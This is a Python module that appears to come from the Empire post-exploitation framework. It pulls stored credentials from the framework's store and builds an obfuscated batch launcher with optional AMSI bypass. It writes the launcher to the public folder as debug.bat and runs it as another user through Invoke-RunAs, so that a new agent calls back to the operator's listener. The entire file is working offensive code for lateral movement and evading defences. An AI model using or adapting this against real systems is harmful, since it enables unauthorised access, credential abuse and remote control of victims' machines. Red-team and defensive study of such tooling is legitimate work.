from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common powerup.ps1 module source code
        module_source = main_menu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        script = f.read()
        f.close()

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            
            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (cred_id, cred_type, domain_name, user_name, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]

            if domain_name != "":
                params["Domain"] = domain_name
            if user_name != "":
                params["UserName"] = user_name
            if password != "":
                params["Password"] = password

        # extract all of our options

        
        l = main_menu.stagers.stagers['windows/launcher_bat']
        l.options['Listener'] = params['Listener']
        l.options['UserAgent'] = params['UserAgent']
        l.options['Proxy'] = params['Proxy']
        l.options['ProxyCreds'] = params['ProxyCreds']
        l.options['Delete'] = "True"
        if (params['Obfuscate']).lower() == 'true':
            l.options['Obfuscate'] = 'True'
        l.options['ObfuscateCommand'] = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            l.options['AMSIBypass'] = 'True'
        if (params['AMSIBypass2'].lower() == 'true'):
            l.options['AMSIBypass2'] = 'True'
        launcher_code = l.generate()

        # PowerShell code to write the launcher.bat out
        script_end = "$tempLoc = \"$env:public\debug.bat\""
        script_end += "\n$batCode = @\"\n" + launcher_code + "\"@\n"
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += "\"Launcher bat written to $tempLoc `n\";\n"
  
        script_end += "\nInvoke-RunAs "
        script_end += "-UserName %s " %(params["UserName"])
        script_end += "-Password %s " %(params["Password"])

        domain = params["Domain"]
        if(domain and domain != ""):
            script_end += "-Domain %s " %(domain)

        script_end += "-Cmd \"$env:public\debug.bat\""

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
